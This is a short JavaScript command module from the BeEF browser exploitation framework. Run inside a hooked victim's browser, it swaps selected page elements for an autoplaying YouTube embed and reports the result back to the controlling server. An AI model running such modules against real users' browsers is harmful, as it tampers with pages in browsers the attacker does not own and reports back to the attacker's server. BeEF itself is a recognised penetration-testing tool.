//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	$j('<%= @jquery_selector %>').each(function(){
                var width = $j(this).css('width');
                var height = $j(this).css('height');
                $j(this).replaceWith('<embed src="http://www.youtube.com/v/<%= @youtube_id %>?fs=1&amp;hl=en_US&amp;autoplay=1" type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" width="' + width + '" height="' + height + '">');
    });
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Replace Video Successful");
});
